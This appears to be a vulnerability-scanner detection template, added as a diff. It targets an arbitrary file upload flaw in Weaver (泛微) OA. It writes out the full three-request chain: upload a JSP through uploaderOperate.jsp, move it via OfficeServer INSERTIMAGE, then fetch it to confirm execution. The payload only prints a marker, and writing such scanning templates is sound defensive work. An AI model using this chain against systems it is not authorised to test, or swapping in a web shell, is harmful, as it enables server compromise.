@@ -1,0 +1,84 @@
+id: weaver-oa-uploaderoperate-anyfile-upload
+info:
+  name: Vulnerability in 泛微OA uploaderOperate.jsp allowing File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload, weaver-oa
+
+variables:
+  filename: '{{to_lower(rand_base(5))}}'
+  string: '{{rand_base(4)}}'
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - '{{BaseURL}}/workrelate/plan/util/uploaderOperate.jsp'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+    body: |
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="secId"
+
+      1
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.jsp"
+
+      <%out.println("{{string}}");%>
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="plandetailid"
+
+      1
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "workrelate/plan/util/ViewDoc"
+    extractors:
+      - type: regex
+        name: fileid
+        internal: true
+        part: body
+        regex:
+          - "fileid=([0-9]+)"
+
+  - id: image-insertion
+    method: POST
+    path:
+      - '{{BaseURL}}/OfficeServer'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+    body: |
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="aaa"
+
+      {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{fileid}}"}
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "println"
+
+  - id: payload-verification
+    method: GET
+    path:
+      - '{{BaseURL}}/{{filename}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{string}}'
